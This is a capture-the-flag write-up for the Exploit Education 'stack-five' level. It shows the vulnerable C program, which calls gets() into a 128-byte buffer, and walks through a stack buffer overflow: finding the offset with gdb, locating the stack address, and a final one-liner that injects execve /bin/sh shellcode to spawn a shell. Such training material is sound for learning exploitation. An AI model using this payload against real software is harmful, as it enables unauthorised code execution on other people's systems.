# STACK FIVE

## SOURCE CODE

```
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

## STRATEGY
First of all we need to determine how many bytes we have to overwrite before the return address, then we can proceed determining the return address for jump at our shellcode and finally we can craft our payload and pwn the challnge! 


## EXPLOIT

1. Open gdb, break at start_level (function with gets, our injection point) and run, then we can use pattern ```pattern create 150``` for create sequence of characters, copy the output, step the program and use the pattern generated as input for gets; now stepping at return instruction and examinating the stack-pointer we can see how characters have overwritten the return address. With ```pattern offset kaablaabma``` we can retrive how many bytes we need to fill with junk until the return address .
![stack-five_0](https://github.com/Apollo3000/Exploit-education-Writeup/blob/master/Phoenix/i486/img/stack-five/stack-five_0.png)
In this case 140 bytes.

2. Now to determine the address of our shellcode we can craft an example payload with 140 "A" and 4 "B" as fake ret address with ```python -c 'print "A"*140 + "B"*4' | ./stack-five```
and examine the segmentation fault error with ```sudo dmesg |tail -n1``` to see SP (stack pointer) address

![stack-five_1](https://github.com/Apollo3000/Exploit-education-Writeup/blob/master/Phoenix/i486/img/stack-five/stack-five_1.png)

3. Last thing we need is a Linux x86 execve /bin/sh shellcode, for example http://shell-storm.org/shellcode/files/shellcode-752.php

4. ```(python -c 'import struct; print "A"*140 + struct.pack("I", 0xffffd640) + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"';cat) | ./stack-five```
